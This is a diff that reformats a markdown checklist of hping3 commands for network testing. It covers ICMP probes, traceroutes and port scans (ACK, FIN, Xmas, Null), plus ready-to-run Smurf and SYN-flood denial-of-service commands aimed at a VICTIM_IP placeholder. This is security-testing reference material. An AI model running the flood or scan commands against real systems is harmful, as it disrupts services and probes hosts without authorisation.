@@ -1,57 +1,16 @@
 # Test with Hping3
 
-- [ ] Testing ICMP:
-
-`hping3 -1 test.com`
-
-- [ ]  Traceroute using ICMP: 
-
-`hping3 --traceroute -V -1 test.com`
-
-- [ ]  Checking port: 
-
-`hping3 -V -S -p 80 -s 5050 test.com`
-
-- [ ]  Traceroute to a determined port: 
-
-`hping3 --traceroute -V -S -p 80 -s 5050 test.com`
-
-- [ ]  Other types of ICMP: 
-
-`hping3 -c 1 -V -1 -C 17 test.com`
-
-- [ ]  Other types of Port Scanning: 
-
-`hping3 -c 1 -V -p 80 -s 5050 -F test.com`
-
-- [ ]  Ack Scan: 
-
-`hping3 -c 1 -V -p 80 -s 5050 -A test.com`
-
-- [ ]  Xmas Scan: 
-
-`hping3 -c 1 -V -p 80 -s 5050 -M 0 -UPF test.com`
-
-- [ ]  Null Scan: 
-
-`hping3 -c 1 -V -p 80 -s 5050 -Y test.com`
-
-- [ ]  Smurf Attack: 
-
-`hping3 -1 --flood -a VICTIM_IP BROADCAST_ADDRESS`
-
-- [ ]  DOS Land Attack:
-
-`hping3 -V -c 1000000 -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source VICTIM_IP`
-`--flood: sent packets as fast as possible. Don't show replies.`
-`--rand-dest: random destionation address mode. see the man.`
-`-V <-- Verbose`
-`-c --count: packet count`
-`-d --data: data size`
-`-S --syn: set SYN flag`
-`-w --win: winsize (default 64)`
-`-p --destport [+][+]<port> destination port(default 0) ctrl+z inc/dec`
-`-s --baseport: base source port (default random)`
+- [ ] Testing ICMP: `hping3 -1 test.com`
+- [ ]  Traceroute using ICMP:  `hping3 --traceroute -V -1 test.com`
+- [ ]  Checking port: `hping3 -V -S -p 80 -s 5050 test.com`
+- [ ]  Traceroute to a determined port: `hping3 --traceroute -V -S -p 80 -s 5050 test.com`
+- [ ]  Other types of ICMP: `hping3 -c 1 -V -1 -C 17 test.com`
+- [ ]  Other types of Port Scanning: `hping3 -c 1 -V -p 80 -s 5050 -F test.com`
+- [ ]  Ack Scan: `hping3 -c 1 -V -p 80 -s 5050 -A test.com`
+- [ ]  Xmas Scan: `hping3 -c 1 -V -p 80 -s 5050 -M 0 -UPF test.com`
+- [ ]  Null Scan: `hping3 -c 1 -V -p 80 -s 5050 -Y test.com`
+- [ ]  Smurf Attack: `hping3 -1 --flood -a VICTIM_IP BROADCAST_ADDRESS`
+- [ ]  DOS Land Attack: `hping3 -V -c 1000000 -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source VICTIM_IP --flood: sent packets as fast as possible. Don't show replies. --rand-dest: random destionation address mode. see the man. -V <-- Verbose -c --count: packet count -d --data: data size -S --syn: set SYN flag -w --win: winsize (default 64) -p --destport [+][+]<port> destination port(default 0) ctrl+z inc/dec -s --baseport: base source port (default random)`
 
 # Hping3 how to use:
 
